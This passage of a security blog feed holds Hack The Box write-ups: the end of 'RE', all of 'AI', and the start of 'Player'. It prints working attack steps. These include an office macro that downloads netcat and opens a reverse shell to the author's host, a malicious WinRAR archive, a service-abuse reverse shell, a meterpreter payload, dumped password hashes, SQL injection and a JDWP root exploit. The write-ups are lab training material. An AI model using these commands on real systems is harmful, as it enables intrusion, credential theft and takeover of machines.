(10.10.10.144)Host is up (0.019s latency).Not shown: 65533 filtered portsPORT    STATE SERVICE       VERSION80/tcp  open  http          Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Ghidra Dropbox Coming Soon!445/tcp open  microsoft-ds?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 45s| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2020-01-29T21:09:29|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 152.37 secondsSMB shareI have access to the malware_dropbox SMB share with read-only privileges:# smbmap -u invalid -H 10.10.10.144[+] Finding open SMB ports....[+] Guest SMB session established on 10.10.10.144...[+] IP: 10.10.10.144:445\tName: re.htb\tDisk                                               \tPermissions\t----                                               \t-----------\tIPC$                                              \tREAD ONLY\tmalware_dropbox                                   \tREAD ONLYHowever the directory is empty:# smbclient -U invalid //10.10.10.144/malware_dropboxEnter WORKGROUP\\invalid's password:Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Mon Jul 22 20:18:47 2019  ..                                  D        0  Mon Jul 22 20:18:47 2019\t\t8247551 blocks of size 4096. 4323774 blocks availableWebsite enumeration: re.htbThe re.htb site is incomplete;The HTML source contains a hint about a Ghidra project directory structure. The title of the page is Ghidra Dropbox Coming Soon! so it’s probably some kind of site where we can upload malware to be analyzed.&lt;!--future capability\t&lt;p&gt; To upload Ghidra project:\t&lt;ol&gt;\t  &lt;li&gt; exe should be at project root.Directory stucture should look something like:\t      &lt;code&gt;&lt;pre&gt;|   vulnerserver.gpr|   vulnserver.exe\\---vulnerserver.rep    |   project.prp    |   projectState    |    +---idata    |   |   ~index.bak    |   |   ~index.dat    |   |    |   \\---00    |       |   00000000.prp    |       |    |       \\---~00000000.db    |               db.2.gbf    |               db.3.gbf    |    +---user    |       ~index.dat    |    \\---versioned            ~index.bak            ~index.dat\t\t  &lt;/pre&gt;&lt;/code&gt;\t  &lt;/li&gt;\t  &lt;li&gt;Add entire directory into zip archive.&lt;/li&gt;\t  &lt;li&gt; Upload zip here:&lt;/li&gt;    &lt;/ol&gt; --&gt;Website enumeration: 10.10.10.144The IP website redirects to reblog.htb so I’ll add that domain to my local hostfile.&lt;meta http-equiv = \"refresh\" content = \"2; url = http://reblog.htb\" /&gt;Website enumeration: reblog.htbAfter adding reblog.htb to my /etc/hosts, the redirect works and I can load the blog page.Based on the HTML source code, I see the blog page is built using Jekyll, a popular static website generator.&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;&lt;!-- Begin Jekyll SEO tag v2.5.0 --&gt;&lt;title&gt;Automation and Accounts on Analysis Box | RE Blog&lt;/title&gt;&lt;meta name=\"generator\" content=\"Jekyll v3.8.5\" /&gt;The blog contains a bunch of useful info, including some potential hints about what we need to do.The .ods file extension is used by LibreOffice Calc and this seems to be a hint that I need to use this file format for my payload. One blog post says that malware samples dropped on the share will automatically be executed, but as a low privilege user. This is likely the first step to get a foothold on the box. The blog posts link to 0xdf’s blog post about Yara rules. The example shown on the blog blacklists the following Subs:  Sub OnLoad  Sub ExploitBecause I can assign any macro to the Open Document event, I can use Run_at_open (or any name for that matter) instead of OnLoad for the function name and it won’t be caught by the YARA rule.I created a sales.ods file with the following macro using certutil to download netcat and execute it.Sub Run_at_open\tShell(\"certutil.exe -urlcache -split -f 'http://10.10.16.9/nc.exe' C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe\")\tShell(\"C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe 10.10.16.9 4444 -e cmd.exe\")End SubThe macro needs to be assigned to the Open Document Event as follows:I now have a shell as Luke and can read the user flag:C:\\Users\\luke\\Desktop&gt;whoamiwhoamire\\lukeC:\\Users\\luke\\Desktop&gt;type user.txttype user.txtFE41736...Privilege escalation to SYSTEM the unintended wayThere’s two other users: cam and coby:C:\\Users\\luke\\Desktop&gt;net usersUser accounts for \\\\RE-------------------------------------------------------------------------------Administrator            cam                      cobyDefaultAccount           Guest                    lukeWDAGUtilityAccountThe command completed successfully.Cam doesn’t have additonal privileges but Coby is a local admin:C:\\Users\\luke\\Desktop&gt;net user cam[...]Local Group Memberships      *UsersGlobal Group memberships     *NoneThe command completed successfully.C:\\Users\\luke\\Desktop&gt;net users coby[...]Local Group Memberships      *Administrators       *Remote Management Use                             *UsersGlobal Group memberships     *NoneThe command completed successfully.Luke’s document directory contains the script process_samples.ps1 that automatically processes the malware samples uploaded to the share. Directory of C:\\Users\\luke\\Documents06/18/2019  02:05 PM    &lt;DIR&gt;          .06/18/2019  02:05 PM    &lt;DIR&gt;          ..07/22/2019  06:31 PM    &lt;DIR&gt;          malware_dropbox07/22/2019  06:32 PM    &lt;DIR&gt;          malware_process07/22/2019  06:32 PM    &lt;DIR&gt;          ods06/18/2019  10:30 PM             1,096 ods.yara06/18/2019  10:33 PM             1,783 process_samples.ps103/13/2019  06:47 PM         1,485,312 yara64.exeAs suspected, the ods.yara file only contains the examples from the blog post and that’s why the Run_at_open method worked.[...]$getos = \"select case getGUIType\" nocase wide ascii$getext = \"select case GetOS\" nocase wide ascii$func1 = \"Sub OnLoad\" nocase wide ascii$func2 = \"Sub Exploit\" nocase wide ascii$func3 = \"Function GetOS() as string\" nocase wide ascii$func4 = \"Function GetExtName() as string\" nocase wide ascii[...]The process_samples.ps1 script that processes malware samples is shown below:$process_dir = \"C:\\Users\\luke\\Documents\\malware_process\"$files_to_analyze = \"C:\\Users\\luke\\Documents\\ods\"$yara = \"C:\\Users\\luke\\Documents\\yara64.exe\"$rule = \"C:\\Users\\luke\\Documents\\ods.yara\"while($true) {\t# Get new samples\tmove C:\\Users\\luke\\Documents\\malware_dropbox\\* $process_dir\t# copy each ods to zip file\tGet-ChildItem $process_dir -Filter *.ods |\tCopy-Item -Destination {$_.fullname -replace \".ods\", \".zip\"}\tGet-ChildItem $process_dir -Filter *.zip | ForEach-Object {\t\t# unzip archive to get access to content\t\t$unzipdir = Join-Path $_.directory $_.Basename\t\tNew-Item -Force -ItemType directory -Path $unzipdir | Out-Null\t\tExpand-Archive $_.fullname -Force -ErrorAction SilentlyContinue -DestinationPath $unzipdir\t\t# yara to look for known malware\t\t$yara_out = &amp; $yara -r $rule $unzipdir\t\t$ods_name = $_.fullname -replace \".zip\", \".ods\"\t\tif ($yara_out.length -gt 0) {\t\t\tRemove-Item $ods_name\t\t}\t}\t# if any ods files left, make sure they launch, and then archive:\t$files = ls $process_dir\\*.ods\tif ( $files.length -gt 0) {\t\t# launch ods files\t\tInvoke-Item \"C:\\Users\\luke\\Documents\\malware_process\\*.ods\"\t\tStart-Sleep -s 5\t\t# kill open office, sleep\t\tStop-Process -Name soffice*\t\tStart-Sleep -s 5\t\t#&amp; 'C:\\Program Files (x86)\\WinRAR\\Rar.exe' a -ep $process_dir\\temp.rar $process_dir\\*.ods 2&gt;&amp;1 | Out-Null\t\tCompress-Archive -Path \"$process_dir\\*.ods\" -DestinationPath \"$process_dir\\temp.zip\"\t\t$hash = (Get-FileHash -Algorithm MD5 $process_dir\\temp.zip).hash\t\t# Upstream processing may expect rars. Rename to .rar\t\tMove-Item -Force -Path $process_dir\\temp.zip -Destination $files_to_analyze\\$hash.rar\t}\tRemove-Item -Recurse -force -Path $process_dir\\*\tStart-Sleep -s 5}If I understand this correctly:  The contents of the malware_dropbox share are moved to C:\\Users\\luke\\Documents\\malware_process  The .ods files are renamed to .zip  The .zip file is extracted and the contents processes by the Yara rules with yara64.exe  If the file matches a Yara rule, it gets deleted  Anything left gets executed with LibreOffice  The files are repackaged in a .rar file and moved to C:\\Users\\luke\\Documents\\ods for further processingThe .rar reference is a subtle hint. When I look at the Downloads directory I see that an old WinRAR version was downloaded:03/13/2019  06:45 PM       298,860,544 LibreOffice_6.2.1_Win_x64.msi03/14/2019  05:13 AM         3,809,704 npp.7.6.4.Installer.x64.exe03/15/2019  10:22 AM         1,987,544 winrar-5-50-beta-1-x86.exeThere’s a CVE-2018-20253 that impacts all versions prior to and including 5.60. When the filename field is manipulated with specific patterns, the destination folder is ignored and the filename is treated as an absolute path. So basically an attacker can write anywhere on the target host when the file is unpacked, not just the directory where’s it’s extracted. This vulnerability is similar to the zipslip vulnerability.The first thing I’ll try it to get the hash of the user extracting the .rar files:# python3 /opt/Evil-WinRAR-Gen/evilWinRAR.py -e evil.txt -g good.txt -p '\\\\10.10.16.9\\snowscan\\gimmehashes'          _ _  __      ___      ___    _   ___  _____ _(_) | \\ \\    / (_)_ _ | _ \\  /_\\ | _ \\ / -_) V / | |  \\ \\/\\/ /| | ' \\|   / / _ \\|   / \\___|\\_/|_|_|   \\_/\\_/ |_|_||_|_|_\\/_/ \\_\\_|_\\                                        by @manulqwerty----------------------------------------------------------------------[+] Evil archive generated successfully: evil.rar[+] Evil path: \\\\10.10.16.9\\snowscan\\gimmehashesThe .rar file will try to extract to an SMB on my system and I’ll use responder to get the NetNTLMv2 hash of the user.I tried cracking Cam’s NTLMv2 hash but I wasn’t able to crack it with rockyou.txt.When I check the web directory, I see that Cam has write access:C:\\inetpub&gt;icacls wwwrootwwwroot RE\\coby:(OI)(CI)(RX,W)        RE\\cam:(OI)(CI)(RX,W)        BUILTIN\\IIS_IUSRS:(OI)(CI)(RX)        NT SERVICE\\TrustedInstaller:(I)(F)        NT SERVICE\\TrustedInstaller:(I)(OI)(CI)(IO)(F)        NT AUTHORITY\\SYSTEM:(I)(F)        NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(IO)(F)        BUILTIN\\Administrators:(I)(F)        BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F)        BUILTIN\\Users:(I)(RX)        BUILTIN\\Users:(I)(OI)(CI)(IO)(GR,GE)        CREATOR OWNER:(I)(OI)(CI)(IO)(F)I can place a webshell in the directory using the same Winrar exploit:And now I have RCE as iis apppool\\reI’ll pop another shell with netcat:# nc -lvnp 5555Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::5555Ncat: Listening on 0.0.0.0:5555Ncat: Connection from 10.10.10.144.Ncat: Connection from 10.10.10.144:60328.Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.c:\\windows\\system32\\inetsrv&gt;whoamiiis apppool\\rec:\\windows\\system32\\inetsrv&gt;Then use PowerUp from Powersploit to look for privesc vectors:c:\\ProgramData&gt;certutil -urlcache -f http://10.10.16.9/PowerUp.ps1 powerup.ps1****  Online  ****CertUtil: -URLCache command completed successfully.c:\\ProgramData&gt;powershell -ep bypassWindows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.PS C:\\ProgramData&gt; import-module .\\powerup.ps1PS C:\\ProgramData&gt; invoke-allchecks[...]ServiceName   : UsoSvcPath          : C:\\Windows\\system32\\svchost.exe -k netsvcs -pStartName     : LocalSystemAbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'CanRestart    : TrueI have write access to the UsoSvc service so I can change the BinPath and execute anything I want as SYSTEM. The default Invoke-ServiceAbuse parameters will simply add a new user with local admin rights.PS C:\\ProgramData&gt; Invoke-ServiceAbuse -Name 'UsoSvc'ServiceAbused Command------------- -------UsoSvc        net user john Password123! /add &amp;&amp; net localgroup Administrators john /addInstead I can pop a reverse shell using netcat I uploaded earlier.PS C:\\ProgramData&gt; Invoke-ServiceAbuse -Name 'UsoSvc' -command 'C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe 10.10.16.9 8888'I have SYSTEM but I can’t read the flag:C:\\Users\\Administrator\\Desktop&gt;icacls root.txtroot.txt NT AUTHORITY\\SYSTEM:(I)(F)         BUILTIN\\Administrators:(I)(F)         RE\\Administrator:(I)(F)         RE\\coby:(I)(F)Successfully processed 1 files; Failed processing 0 filesC:\\Users\\Administrator\\Desktop&gt;type root.txttype root.txtAccess is denied.I also lose my shell after a few seconds because the process doesn’t respond to the service manager so it gets terminated.I’m going to drop a Meterpreter payload on the box, run it as SYSTEM and quickly migrate to a new process so I don’t lose the shell:# msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o met.exe LHOST=10.10.16.9 LPORT=4444C:\\Windows\\System32\\spool\\drivers\\color&gt;certutil -urlcache -f http://10.10.16.9/met.exe met.exe****  Online  ****CertUtil: -URLCache command completed successfully.Got a stable shell now, let’s dump the hashes first:meterpreter &gt; hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:caf97bbc4c410103485a3cf950496493:::cam:1002:aad3b435b51404eeaad3b435b51404ee:1916525df2db99ef56a75152807da93d:::coby:1000:aad3b435b51404eeaad3b435b51404ee:fa88e03e41fdf7b707979c50d57c06cf:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::john:1003:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::luke:1001:aad3b435b51404eeaad3b435b51404ee:3670611a3c1a68757854520547ab5f24:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:275fb2a3ea8b2433976482b69b94497b:::I can’t read root.txt because it’s encrypted for Coby:C:\\Users\\Administrator\\Desktop&gt;cipher /c root.txt Listing C:\\Users\\Administrator\\Desktop\\ New files added to this directory will not be encrypted.E root.txt  Compatibility Level:    Windows XP/Server 2003  Users who can decrypt:    RE\\Administrator [Administrator(Administrator@RE)]    Certificate thumbprint: E088 5900 BE20 19BE 6224 E5DE 3D97 E3B4 FD91 C95D    coby(coby@RE)    Certificate thumbprint: 415E E454 C45D 576D 59C9 A0C3 9F87 C010 5A82 87E0  No recovery certificate found.  Key Information:    Algorithm: AES    Key Length: 256    Key Entropy: 256I’ll do it the easy and just impersonate Coby since I have SYSTEM access.meterpreter &gt; load incognito[-] The 'incognito' extension has already been loaded.meterpreter &gt; list_tokens -u cobyDelegation Tokens Available========================================Font Driver Host\\UMFD-0Font Driver Host\\UMFD-1IIS APPPOOL\\reIIS APPPOOL\\REblogNT AUTHORITY\\IUSRNT AUTHORITY\\LOCAL SERVICENT AUTHORITY\\NETWORK SERVICENT AUTHORITY\\SYSTEMRE\\camRE\\cobyRE\\lukeWindow Manager\\DWM-1Impersonation Tokens Available========================================IIS APPPOOL\\ipmeterpreter &gt; impersonate_token RE\\\\coby[+] Delegation token available[+] Successfully impersonated user RE\\cobyAnd I can now read the flag:meterpreter &gt; shellProcess 3760 created.Channel 2 created.Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;type c:\\users\\administrator\\desktop\\root.txttype c:\\users\\administrator\\desktop\\root.txt1B4FB90..."
  },
  
  {
    "title": "AI - Hack The Box",
    "url": "/posts/htb-writeup-ai/",
    "categories": "hackthebox, infosec",
    "tags": "tts, sqli, jdwp",
    "date": "2020-01-25 00:00:00 +0800",
    





    
    "snippet": "Exploiting the simple SQL injection vulnerability on the AI box was harder than expected because of the text-to-speech conversion required. I had to use a few tricks to inject the single quote in t...",
    "content": "Exploiting the simple SQL injection vulnerability on the AI box was harder than expected because of the text-to-speech conversion required. I had to use a few tricks to inject the single quote in the query and the other parameters needed for the injection.Summary  There is a web application with a speech based API interface that contains a SQL injection  By using a text-to-speech tool we can create a wav file that contains a payload to exploit the SQL injection  The user credentials are retrieved from the database and we can SSH in  The Java Debug Wire Protocol (JDWP) is enabled on the running Tomcat server and its port is exposed locally  We can execute arbitrary code as root using JDWPBlog / Tools  https://www.exploit-db.com/papers/27179  https://www.exploit-db.com/exploits/46501NmapThe attack surface is pretty small on this box: I only see SSH and HTTP listening.root@kali:~/htb/ai# nmap -sC -sV -T4 10.10.10.163Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-10 09:53 ESTNmap scan report for ai.htb (10.10.10.163)Host is up (0.046s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Hello AI!Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb enumerationWhat we have here is some company that does voice recognition from audio files. There’s a link to upload wav files so this is probably the function that we have to exploit in order to progress on this machine.I did my normal gobuster enumeration and found a couple of additional files that didn’t show up on the main page.root@kali:~/htb/ai# gobuster dir -q -t 50 -w /opt/SecLists/Discovery/Web-Content/big.txt -x php -u http://10.10.10.163/about.php (Status: 200)/ai.php (Status: 200)/contact.php (Status: 200)/db.php (Status: 200)/images (Status: 301)/index.php (Status: 200)/intelligence.php (Status: 200)/server-status (Status: 403)/uploads (Status: 301)Interesting files:  db.php: this is probably used to connect to some database backend so there may a SQLi I have to exploit here  intelligence.php: this contains a list of voice input commands that are converted to special commands on the backendSQL injection on the voice API pageThe most annoying of this machine was finding a text to speech application that would produce reliable results. I tried a bunch of different online and offline tools but some of them produced files that did not decode properly on the target machine. I used https://ttsmp3.com and with the help of some scripting I’m able to automate the creation and conversion of the voice file.#!/bin/bashTXT=$1URL=$(curl -s https://ttsmp3.com/makemp3.php -H 'Content-type: application/x-www-form-urlencoded' --data \"msg=$TXT\" -d 'lang=Joey' -d 'source=ttsmp3' | jq -r .URL)curl -s -o speak.mp3 $URLffmpeg -v 0 -y -i speak.mp3 speak.wavcurl -s http://ai.htb/ai.php -F fileToUpload='@speak.wav;type=audio/x-wav' -F submit='Process It!' | grep \"Our understanding\"I can see below that the script works but unfortunately quote doesn’t get converted to its character equivalent so I can’t inject that way../tts.sh hello&lt;h3&gt;Our understanding of your input is : hello&lt;br /&gt;Query result : &lt;h3&gt;./tts.sh quote&lt;h3&gt;Our understanding of your input is : quote&lt;br /&gt;Query result : &lt;h3&gt;By using the word it's, the application generates a quote and I can see that we have a MySQL SQL injection here../tts.sh \"its or one equals one Comment Database\"&lt;h3&gt;Our understanding of your input is : it's or 1 = 1 -- -&lt;br /&gt;Query result : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 's or 1 = 1 -- -'' at line 1&lt;By using open single quote in the audio file, it will generate a single quote and I can use a simple 1=1 condition to return all entries from the database. In this case, the print(\"hi\") row is shown.root@kali:~/htb/ai# ./tts.sh \"open single quote ore one equals one Comment Database\"&lt;h3&gt;Our understanding of your input is : 'or 1 = 1 -- -&lt;br /&gt;Query result : print(\"hi\")&lt;h3&gt;I guessed that the table I had to check out was users and I was able to retrieve the password with the following query: ' UNION SELECT password FROM users -- -./tts.sh \"open single quote union select password from users Comment Database\"&lt;h3&gt;Our understanding of your input is : 'union select password from users -- -&lt;br /&gt;Query result : H,Sq9t6}a&lt;)?q93_&lt;h3&gt;Password: H,Sq9t6}a&lt;)?q93_I don’t have the username and I can’t do a query like ' UNION SELECT username FROM users -- - because the application will read it as ' UNION SELECT user name FROM users -- - instead. However before the box was released it was called Alexa so I just guessed that the username was Alexa and I was able to SSH in.root@kali:~/htb/ai# ssh alexa@10.10.10.163alexa@10.10.10.163's password: alexa@AI:~$ cat user.txtc43b62...Trying to exploit the UID bugAlexa can run vi as any user except root. There is a well known trick I can use to spawn a shell from within vi with :!/bin/bash but since I can’t sudo vi as root I can only get access to mrr3boot.alexa@AI:~$ sudo -l[sudo] password for alexa: Matching Defaults entries for alexa on AI:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser alexa may run the following commands on AI:    (ALL, !root) /usr/bin/vialexa@AI:~$ lslogins       UID USER            PROC PWD-LOCK PWD-DENY  LAST-LOGIN GECOS         0 root             127                   Nov04/09:42 root         1 daemon             1                               daemon         2 bin                0                               bin         3 sys                0                               sys         4 sync               0                               sync         5 games              0                               games         6 man                0                               man         7 lp                 0                               lp         8 mail               0                               mail         9 news               0                               news        10 uucp               0                               uucp        13 proxy              0                               proxy        33 www-data          10                               www-data        34 backup             0                               backup        38 list               0                               Mailing List Manager        39 irc                0                               ircd        41 gnats              0                               Gnats Bug-Reporting System (admin)       100 systemd-network    0                               systemd Network Management,,,       101 systemd-resolve    1                               systemd Resolver,,,       102 syslog             1                                      103 messagebus         1                                      104 _apt               0                                      105 lxd                0                                      106 uuidd              0                                      107 dnsmasq            0                               dnsmasq,,,       108 landscape          0                                      109 pollinate          0                                      110 sshd               0                                      111 mysql              1                               MySQL Server,,,       112 rtkit              0                               RealtimeKit,,,       113 pulse              0                               PulseAudio daemon,,,       114 avahi              2                               Avahi mDNS daemon,,,       115 geoclue            0                                     1000 alexa              5                         15:32 alexa     65534 nobody             0                               nobody4000000000 mrr3boot           0    alexa@AI:~$ sudo -u mrr3boot vi:!/bin/bashmrr3boot@AI:~$ iduid=4000000000(mrr3boot) gid=1001(mrr3boot) groups=1001(mrr3boot)That high UID is very strange and after doing some research I found a systemd bug that should have let me run any systemctl commands.Unfortunately even though the pkttyagent seems to crash, I was not able to exploit the bug:mrr3boot@AI:~$ systemctl restart ssh**ERROR:pkttyagent.c:175:main: assertion failed: (polkit_unix_process_get_uid (POLKIT_UNIX_PROCESS (subject)) &gt;= 0)Failed to restart ssh.service: Interactive authentication required.See system logs and 'systemctl status ssh.service' for details.This seems like a dead end so I’ll move on to something else.Privesc with Java Debug Wire ProtocolLooking at the listening ports I found ports 8000, 8005, 8009 and 8080 listening on localhost.(No info could be read for \"-p\": geteuid()=-294967296 but you should be root.)Active Internet connections (servers and established)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   tcp        0    492 10.10.10.163:22         10.10.14.51:38906       ESTABLISHED -                   tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      -                   tcp6       0      0 :::80                   :::*                    LISTEN      -                   tcp6       0      0 :::22                   :::*                    LISTEN      -                   tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      -                   tcp6       0      0 127.0.0.1:8009          :::*                    LISTEN      -                   udp        0      0 0.0.0.0:49179           0.0.0.0:*                           -                   udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   udp6       0      0 :::38547                :::*                                -                   udp6       0      0 :::5353                 :::*                                -I did some port forwarding and saw that port 8080 is running the Tomcat manager but I was not able to log in using any of the default credentials.Then I noticed that the Tomcat server has the JDWP option enabled: jdwp=transport=dt_socket,address=localhost:8000,server=y/usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap startI used the https://www.exploit-db.com/exploits/46501 exploit to get RCE as root. I chose to make /bin/bash SUID so I could just get a shell directly by using bash -p. I need to trigger a connection to port 8005 locally on the machine after I’ve launched the exploit.root@kali:~/htb/ai# python jdwp.py -t 127.0.0.1 -p 8000 --cmd 'chmod u+s /bin/bash'[+] Targeting '127.0.0.1:8000'[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'[+] Found Runtime class: id=bc4[+] Found Runtime.getRuntime(): id=7fe7f003e960[+] Created break event id=2[+] Waiting for an event on 'java.net.ServerSocket.accept'[+] Received matching event from thread 0xc69[+] Selected payload 'chmod u+s /bin/bash'[+] Command string object created id:c6a[+] Runtime.getRuntime() returned context id:0xc6b[+] found Runtime.exec(): id=7fe7f003e998[+] Runtime.exec() successful, retId=c6c[!] Command successfully executedalexa@AI:~$ /bin/bash -pbash-4.4# iduid=1000(alexa) gid=1000(alexa) euid=0(root) groups=1000(alexa)bash-4.4# cat /root/root.txt0ed04f2..."
  },
  
  {
    "title": "Player - Hack The Box",
    "url": "/posts/htb-writeup-player/",
    "categories": "hackthebox, infosec",
    "tags": "php, jwt, vhosts, codiad, ffmpeg, lshell, openssh xauth, pspy, cronjob, php deserialization",
    "date": "2020-01-18 00:00:00 +0800",
    





    
    "snippet": "Player was a tough one. Getting the initial shell on Player took me quite some time. Every time I got new credentials I thought I would be able to log in but there was always another step after. Th...",
    "content": "Player was a tough one. Getting the initial shell on Player took me quite some time. Every time I got new credentials I thought I would be able to log in but there was always another step after. The trickiest part of the box for me was finding the .php~ extension to read the source code of the page. I had the hint from the chat application but I couldn’t connect the dots.Summary  Scan for vhosts to find the dev, chat and staging websites.  Find a hint about exposed source code by looking at the chat website.  On the main webpage, perform directory bruteforcing and find the launcher page.  The source code for PHP file used in the javascript AJAX call of the launcher page can be retrieved by appending a tilde to the file extension.  The source code contains the JWT shared secret and we can now forge our own token to log in to the application.  The media conversion web page uses ffmpeg in the backend which we can use to perform an LFI and retrieve the content of a service configuration file.  The file contains the telegen user credentials which we can use to log into a lshell restricted shell.  We can break out of the restricted shell by using enumerating the SSH configuration file through ffmpeg and seeing that xauth is enabled. The xauth exploit allows us to read files on the system and we find another set of credentials in some of the staging PHP code.  The credentials for user peter allow us to log into the codiad application and create a PHP script inside of web directory path, give us RCE and a shell.  By watching processes with pspy, we identify there’s a PHP script that runs regurlarly as root.  The PHP script contains a deserialization vulnerability which we exploit to write SSH keys into the root directory and then log in with SSH.Fails  When I decoded the JWT token found on the launcher page, I saw that the access_code was a SHA1 hash. When I looked up the hash online, I saw it was welcome and thought it was used to log into the server. It was useless after all… Womp womp.  I was able to log into the MySQL server without any credentials by port-forwarding once I had creds for the lshell. Then saw I could update the stats table and thought about inserting PHP code into the page. But as it turns out, the string is inserted as part of the PHP code which is already running and querying the database so I ended with a nice &lt;?php phpinfo(); ?&gt; that wasn’t interpreted.PortscanRunning my portscan I see that a 2nd SSH service is running on port 6686 with a different version.root@ragingunicorn:~/htb/player# nmap -sC -sV -p- 10.10.10.145Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-06 19:03 EDTNmap scan report for player.htb (10.10.10.145)Host is up (0.019s latency).Not shown: 65532 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)|   2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)|   256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)|_  256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)80/tcp   open  http    Apache httpd 2.4.7|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: 403 Forbidden6686/tcp open  ssh     OpenSSH 7.2 (protocol 2.0)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelEnumerating the website on port 80I add player.htb to my local hostfile and start enumerating the web site on port 80. The main page doesn’t seem to have any files that match the default directory index and indexing is disabled so I get a 403 Forbidden error.I will have to run gobuster to find something. As always, I will start with one of my go-to list: big.txt and add the php file extension.root@ragingunicorn:~/htb/player# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 25 -x php -u http://player.htb/launcher (Status: 301)/server-status (Status: 403)Next, I look at the /launcher directory with the same wordlist:root@ragingunicorn:~/htb/player# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 25 -x php -u http://player.htb/launcher/css (Status: 301)/fonts (Status: 301)/images (Status: 301)/js (Status: 301)/vendor (Status: 301)Not much interesting seen with gobuster. I’ll check the link next with Firefox and see it’s a page about an upcoming product. There’s a countdown at the top and a link to register for product launch announcements.Nothing seems to happen when I put an email address in the form. When I check the HTML source I see that the form goes to dee8dc8a47256c64630d803a4c40786c.php. That file just redirects to /launcher when we do a GET on it.I could check the HTML source code for all the links on the page but instead I’ll use Burp instead to spider the site.A couple of files stand out, those two filenames that look like an MD5 checksum and the javascript files for the site.The simplebuff.js file does an AJAX call to dee8dc8a47256c64630d803a4c40786e.php every 10 seconds to check if the game has been released. The only response I see is Not released yet.The /launcher/dee8dc8a47256c64630d803a4c40786c.php link does a GET and returns a cookie with a JWT token:Set-Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU; 